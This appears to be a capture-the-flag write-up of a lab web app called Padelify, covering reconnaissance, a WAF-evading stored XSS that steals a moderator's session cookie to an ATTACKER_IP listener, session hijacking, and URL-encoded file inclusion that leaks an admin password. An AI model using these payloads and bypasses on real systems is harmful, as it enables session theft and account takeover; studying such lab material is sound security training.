@@ -1,0 +1,135 @@
+1. Initial Reconnaissance
+
+I started by performing a full TCP scan against the target to identify all exposed services.
+ nmap -sC -sV -p- 10.112.168.105
+
+The scan revealed two open ports:
+ 22/tcp  open  ssh
+ 80/tcp  open  http
+
+Port 22 was running OpenSSH, while port 80 was hosting an Apache web server on Ubuntu.
+The HTTP service also revealed a PHPSESSID cookie without the HttpOnly flag, which was an interesting detail to keep in mind during the web application assessment.
+
+I then opened the web application in a browser.
+The page appeared to be a simple tournament registration application called Padelify.
+
+ ---------------            ---------------            ---------------            ---------------            ---------------            ---------------                                                                   
+
+2. Directory Enumeration
+
+My next step was to enumerate the web server for hidden files and directories.
+
+I used Dirsearch for this:
+ dirsearch -u http://10.112.168.105
+
+Among the discovered paths, two directories immediately caught my attention:
+ /logs
+ /config
+
+The /config directory contained an app.conf file, although directly accessing it was blocked by the WAF.
+The /logs directory was more accessible and contained an error.log file.
+
+After reviewing the log, I noticed evidence of a previous XSS attempt. This was an important clue because it suggested that the application could potentially be vulnerable to cross-site scripting despite the presence of the WAF.
+The registration page also mentioned that registrations required moderator approval.
+
+That made the moderator an interesting target: if an XSS payload could execute in the moderator's browser, it might be possible to obtain the moderator's session.
+
+ ---------------            ---------------            ---------------            ---------------            ---------------            ---------------                                                                   
+
+3. Identifying the XSS
+
+To verify whether injected HTML could make an outbound request, I started a simple HTTP server on my attacker machine:
+ python3 -m http.server 5000
+
+I then submitted the following payload through the registration functionality:
+<img src='http://ATTACKER_IP:5000'>
+
+The purpose of this payload was simply to determine whether the HTML would be rendered by the moderator's browser.
+When the request appeared on my HTTP server, it confirmed that the injected HTML was being processed successfully.
+At this point, I knew that XSS was possible and that the main challenge was finding a payload that could get past the WAF.
+
+ ---------------            ---------------            ---------------            ---------------            ---------------            ---------------                                                                   
+
+4. Bypassing the XSS Filters
+
+I tested several variations of XSS payloads and identified a number of filtering rules.
+
+The WAF was blocking:
+ <script> tags
+ The literal word cookie
+ <img> tags combined with onload or onerror
+ Several HTML entity encoded variations
+
+Since the obvious payloads were being detected, I changed the approach instead of repeatedly modifying the same syntax.
+An <iframe> with an onload event provided another way to execute JavaScript:
+ <iframe onload="new Image().src='http://ATTACKER_IP:1234?x='+document['coo'+'kie']">
+
+The important part of the payload is:
+ document['coo'+'kie']
+
+Rather than writing document.cookie directly, the string is constructed dynamically by JavaScript.
+The browser interprets it as:
+ document.cookie
+
+while the original request does not contain the literal cookie token in the same form that the WAF was looking for.
+When the moderator viewed the malicious registration, the JavaScript executed and sent the session information to my listener.
+
+I successfully received the moderator's session cookie.
+
+ ---------------            ---------------            ---------------            ---------------            ---------------            ---------------                                                                   
+
+5. Accessing the Moderator Dashboard
+
+With the captured session value, I opened the browser's developer tools and went to the browser storage section.
+I replaced my existing session cookie with the moderator's cookie.
+After refreshing the application, the server recognized the session as belonging to the moderator.
+I was redirected to the dashboard, where the first flag was displayed.
+This confirmed that the XSS vulnerability could be used for privilege escalation by taking over the moderator's session.
+
+ ---------------            ---------------            ---------------            ---------------            ---------------            ---------------                                                                   
+
+6. Finding a Path to Administrator Access
+
+After obtaining moderator access, I continued exploring the available functionality.
+The dashboard contained a Live link in the navigation bar.
+Following it led to a page containing a GET parameter similar to:
+ ?page=match.php
+
+The presence of a parameter controlling which page was loaded immediately made me consider whether the application was performing server-side file retrieval.
+I first tested a common local file path:
+ /etc/passwd
+
+However, the WAF detected and blocked the request.
+I then remembered the app.conf file discovered earlier under:
+ /config/app.conf
+
+
+Directly supplying this path through the page parameter was also blocked.
+This suggested that the application might allow the file to be retrieved, but the WAF was identifying recognizable strings in the request.
+
+ ---------------            ---------------            ---------------            ---------------            ---------------            ---------------                                                                   
+
+7. URL-Encoding WAF Bypass
+
+Instead of sending the path in its normal representation, I encoded it using URL encoding.
+The original path was:
+ /config/app.conf
+
+I converted the path into its URL-encoded form using Burp Suite and sent the modified request.
+The WAF did not recognize the encoded representation as the same malicious path, while the application subsequently decoded it and processed the requested resource.
+The response contained the contents of app.conf.
+
+One particularly interesting entry was:
+ admin_info = "bL}8,S9W1o44"
+
+This value looked like an administrator credential.
+
+ ---------------            ---------------            ---------------            ---------------            ---------------            ---------------                                                                   
+
+8. Administrator Compromise
+
+I returned to the application's login page and tested the discovered value against the admin account.
+The credentials were accepted successfully.
+I was now authenticated as the administrator and had full administrative access to the application.
+
+The final flag was displayed after gaining administrator access.
